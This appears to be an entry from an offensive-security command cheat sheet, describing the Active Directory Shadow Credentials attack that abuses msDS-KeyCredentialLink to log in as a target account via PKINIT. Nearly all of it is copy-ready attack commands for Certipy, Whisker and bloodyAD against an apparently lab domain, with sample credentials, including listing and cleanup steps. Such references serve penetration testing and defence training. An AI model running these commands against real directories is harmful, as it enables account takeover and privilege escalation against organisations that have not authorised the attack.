---
description: |
  Shadow Credentials attack — abuse msDS-KeyCredentialLink to add key credentials and authenticate as the target account via PKINIT.
commands:
  - have: Credentials
    cmd: |
      # Certipy — shadow credentials auto exploitation
      certipy shadow auto -target dc01.senshu.sh -u sec_user@senshu.sh -p 'P@ssw0rd' -account victim

      # Whisker — add shadow credentials (Windows)
      .\Whisker.exe add /target:victim /domain:senshu.sh /dc:dc01.senshu.sh

      # bloodyAD — add shadow credentials
      bloodyAD -d senshu.sh -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add shadowCredentials victim

      # bloodyAD — list shadow credentials
      bloodyAD -d senshu.sh -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 get shadowCredentials victim

      # bloodyAD — remove shadow credentials (cleanup)
      bloodyAD -d senshu.sh -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 remove shadowCredentials victim
phase:
  - Exploitation
target_os:
  - Windows
services:
  - LDAP
techniques:
  - Shadow_Credentials
references:
  - https://github.com/ly4k/Certipy
  - https://github.com/eladshamir/Whisker
  - https://github.com/CravateRouge/bloodyAD
---
